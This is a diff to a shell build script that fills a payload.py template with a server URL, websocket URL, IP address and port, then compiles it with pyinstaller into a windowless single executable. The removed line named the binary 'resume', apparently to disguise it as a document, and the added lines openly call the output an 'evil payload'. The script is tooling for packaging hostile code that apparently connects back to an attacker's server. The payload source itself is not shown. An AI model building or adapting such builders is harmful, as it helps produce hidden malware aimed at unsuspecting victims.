@@ -21,6 +21,7 @@ fi
 echo "[*] OS detected: $OS"
 echo "[*] Creating temp file..."
 cp payload.py payload_temp.py
+echo "[*] Replacing placeholders..."
 if [ "$OS" == "mac" ]; then
   sed -i '' "s|__SERVER_URL__|$SERVER_URL|g" payload_temp.py
   sed -i '' "s|__WEBSOCKET_URL__|$WEBSOCKET_URL|g" payload_temp.py
@@ -34,7 +35,9 @@ else
   sed -i "s|__IP_ADDRESS__|$IP_ADDRESS|g" payload_temp.py
   sed -i "s|__PORT__|$PORT|g" payload_temp.py
 fi
-echo "[*] Building..."
-pyinstaller --onefile --noconsole --clean --name resume payload_temp.py
+echo "[*] Building evil payload..."
+pyinstaller --onefile --noconsole --name payload ./payload_temp.py
+echo "[*] Cleaning up..."
 rm -f payload_temp.py
-echo "[+] Done!"
+rm -rf __pycache__ build/
+echo "[+] Evil payload built: dist/evil_payload 😈"
